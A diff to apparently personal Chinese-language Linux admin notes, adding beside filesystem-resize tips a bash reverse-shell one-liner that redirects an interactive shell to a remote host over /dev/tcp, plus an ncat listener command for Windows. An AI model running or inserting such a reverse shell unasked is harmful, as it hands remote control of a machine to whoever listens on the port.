@@ -50,6 +50,14 @@
             sudo resize2fs /dev/mapper/ubuntu--vg-ubuntu--lv
                 resize2fs ：调整文件系统大小。
                 /dev/mapper/ubuntu--vg-ubuntu--lv ：逻辑卷路径。
+    其它
+        bash -i
+            新建一个交互式终端
+        bash -i >& /dev/tcp/192.168.31.240/9999 0>&1
+            新建一个交互式终端，并将该终端的输入输出重定向到远程主机的指定端口上。
+                远程主机需要提前监听该端口
+                    Windows
+                        ncat -lvvp 9999
 环境
     Ubuntu 20.04.6 LTS 
         国内镜像
